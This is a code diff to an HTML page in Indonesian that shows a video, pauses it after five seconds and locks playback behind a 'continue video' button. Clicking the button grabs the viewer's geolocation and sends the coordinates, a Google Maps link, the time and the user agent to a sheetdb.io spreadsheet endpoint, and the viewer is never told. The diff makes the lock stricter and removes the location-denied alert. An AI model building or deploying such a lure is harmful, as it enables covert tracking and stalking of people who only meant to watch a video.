@@ -7,11 +7,11 @@
 
 <body style="margin:0; background:black;">
 
-<video id="vid" width="100%" controls autoplay muted playsinline>
+<video id="vid" width="100%" autoplay muted playsinline controls>
   <source src="https://files.catbox.moe/ezxq5k.mp4" type="video/mp4">
 </video>
 
-<div id="box" style="position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
+<div id="box" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
   <p>Tekan untuk melanjutkan video</p>
   <button onclick="lanjut()" style="padding:12px; font-size:16px;">
     ▶ Lanjutkan Video
@@ -19,45 +19,54 @@
 </div>
 
 <script>
-let sudah = false;
 let v = document.getElementById("vid");
+let sudah = false;
+let terkunci = false;
 
-// pause dulu
-v.pause();
+// setelah 5 detik -> pause & lock
+v.ontimeupdate = () => {
+  if (v.currentTime >= 5 && !terkunci) {
+    v.pause();
+    terkunci = true;
+
+    // tampilkan tombol
+    document.getElementById("box").style.display = "block";
+  }
+};
+
+// cegah play manual sebelum klik tombol
+v.addEventListener("play", () => {
+  if (terkunci && !sudah) {
+    v.pause();
+  }
+});
 
 function lanjut() {
   if (sudah) return;
   sudah = true;
 
-  navigator.geolocation.getCurrentPosition(
-    pos => {
+  navigator.geolocation.getCurrentPosition(pos => {
 
-      let lat = pos.coords.latitude;
-      let lon = pos.coords.longitude;
+    let lat = pos.coords.latitude;
+    let lon = pos.coords.longitude;
 
-      fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          data: [{
-            waktu: new Date().toLocaleString(),
-            latitude: lat,
-            longitude: lon,
-            maps: "https://www.google.com/maps?q=" + lat + "," + lon,
-            device: navigator.userAgent
-          }]
-        })
+    fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        data: [{
+          waktu: new Date().toLocaleString(),
+          latitude: lat,
+          longitude: lon,
+          maps: "https://www.google.com/maps?q=" + lat + "," + lon,
+          device: navigator.userAgent
+        }]
       })
-      .then(res => res.json())
-      .then(data => console.log("Berhasil:", data))
-      .catch(err => console.log("Error:", err));
+    });
 
-    },
-    err => {
-      alert("Izin lokasi ditolak");
-    }
-  );
+  });
 
+  // buka lock & lanjut video
   v.play();
   document.getElementById("box").style.display = "none";
 }
